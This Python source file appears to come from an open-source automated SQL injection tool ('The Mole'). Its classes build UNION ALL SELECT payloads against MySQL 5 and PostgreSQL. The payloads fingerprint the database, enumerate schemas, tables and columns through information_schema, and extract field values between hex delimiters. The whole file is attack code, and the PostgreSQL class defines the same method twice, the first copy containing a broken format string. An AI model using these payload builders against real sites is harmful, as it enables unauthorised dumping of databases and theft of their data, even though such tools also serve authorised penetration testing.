#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Santiago Alessandri
# Matías Fontanini
# Gastón Traberg

import re

class DbmsMole():
    
    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        pass
    
    @classmethod
    def to_hex(cls, string):
        output = ""
        for i in string:
            output += hex(ord(i)).replace('0x', '')
        return '0x' + output

    @classmethod
    def injectable_field_finger(cls, query_columns, base):
        hashes = []
        to_search = []
        for i in range(0, query_columns):
            hashes.append(DbmsMole.to_hex(str(base + i)))
            to_search.append(str(base + i))
        return (hashes, to_search)
    
    @classmethod
    def field_finger(cls):
        pass
        
    @classmethod
    def dbms_name(cls):
        return ''

class Mysql5Mole(DbmsMole):

    out_delimiter = "0x3a3a2d3a3a"
    out_delimiter_result = "::-::"
    inner_delimiter = "0x3a3a"
    inner_delimiter_result = "::"
    field_finger_str = 'The_Mole.mysqlfinger!'

    @classmethod
    def parse_condition(self, condition):
        cond = condition.split("'")
        for i in range(len(cond)):
            if i % 2 == 1:
                cond[i] = DbmsMole.to_hex(cond[i])
        return ''.join(cond)
    
    @classmethod
    def dbms_name(cls):
        return 'Mysql 5'
    
    @classmethod
    def field_finger(cls):
        return Mysql5Mole.field_finger_str
    
    @classmethod
    def field_finger_query(cls, columns, injectable_field):
        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
        query_list = list(map(str, range(columns)))
        query_list[injectable_field] = DbmsMole.to_hex(Mysql5Mole.field_finger_str)
        query += ",".join(query_list) + " {com}"
        return query
    
    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
        query_list = list(map(str, range(columns)))
        query_list[injectable_field] = "@@version"
        query += ",".join(query_list) + " {com}"
        return query
    
    
    @classmethod
    def forge_query(cls, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
        query_list = list(map(str, range(column_count)))
        query_list[injectable_field] = ("CONCAT(" +
                                            Mysql5Mole.out_delimiter +
                                            ",CONCAT_WS(" +
                                                Mysql5Mole.inner_delimiter + "," + 
                                                fields +
                                            ")," +
                                            Mysql5Mole.out_delimiter +
                                        ")")
        query += ','.join(query_list)
        query += " from " + table_name + " where " + Mysql5Mole.parse_condition(where) + \
                 " limit 1 offset " + str(offset) + "{com}"
        return query

    @classmethod
    def schema_count_query(cls, columns, injectable_field):
        return Mysql5Mole.forge_query(columns, "count(*)", 
               "information_schema.schemata", injectable_field, offset=0)
    
    @classmethod
    def schema_query(cls, columns, injectable_field, offset):
        return Mysql5Mole.forge_query(columns, "schema_name", 
               "information_schema.schemata", injectable_field, offset=offset)

    @classmethod
    def table_count_query(cls, db, columns, injectable_field):
        return Mysql5Mole.forge_query(columns, "count(*)", 
                    "information_schema.tables", injectable_field,
                    "table_schema = " + DbmsMole.to_hex(db),
               )

    @classmethod
    def table_query(cls, db, columns, injectable_field, offset):
        return Mysql5Mole.forge_query(columns, "table_name", 
                    "information_schema.tables", injectable_field,
                    "table_schema = " + DbmsMole.to_hex(db), offset
               )

    @classmethod
    def columns_count_query(cls, db, table, columns, injectable_field):
        return Mysql5Mole.forge_query(columns, "count(*)", 
                    "information_schema.columns", injectable_field,
                    where="table_schema = " + DbmsMole.to_hex(db) + 
                    " and table_name = " + DbmsMole.to_hex(table)
               )

    @classmethod
    def columns_query(cls, db, table, columns, injectable_field, offset):
        return Mysql5Mole.forge_query(columns, "column_name", 
                    "information_schema.columns", injectable_field,
                    "table_schema = " + DbmsMole.to_hex(db) + 
                    " and table_name = " + DbmsMole.to_hex(table), 
                    offset
               )

    @classmethod
    def fields_count_query(cls, db, table, columns, injectable_field, where="1=1"):
        return Mysql5Mole.forge_query(columns, "count(*)", 
                    db + "." + table, injectable_field,
                    where=where
               )

    @classmethod
    def fields_query(cls, db, table, fields, columns, injectable_field, offset, where="1=1"):
        return Mysql5Mole.forge_query(columns, ",".join(fields), 
                    db + "." + table, injectable_field,
                    where=where, 
                    offset=offset
               )

    @classmethod
    def dbinfo_query(cls, columns, injectable_field):
        return Mysql5Mole.forge_query(columns, "user(),version()", 
               "information_schema.schemata", injectable_field, offset=0)

    @classmethod
    def parse_results(cls, url_data):
        data_list = url_data.split(Mysql5Mole.out_delimiter_result)
        if len(data_list) != 3:
            return None
        data = data_list[1]
        return data.split(Mysql5Mole.inner_delimiter_result)
    
    def __str__(self):
        return "Mysql 5 Mole"

class PostgresMole(DbmsMole):
    
    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
        query += ','.join(map(lambda x: 'chr({0})::unknown'.format(''), map(str, range(columns)))).replace(
            str(injectable_field),
            "@@version",
            1
        )
        query += " {com}"
        return query

    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
        query += ','.join(map(str, range(columns))).replace(
            str(injectable_field),
            "getpgusername()",
            1
        )
        query += " {com}"
        return query
    
    def __str__(self):
        return "Posgresql Mole"
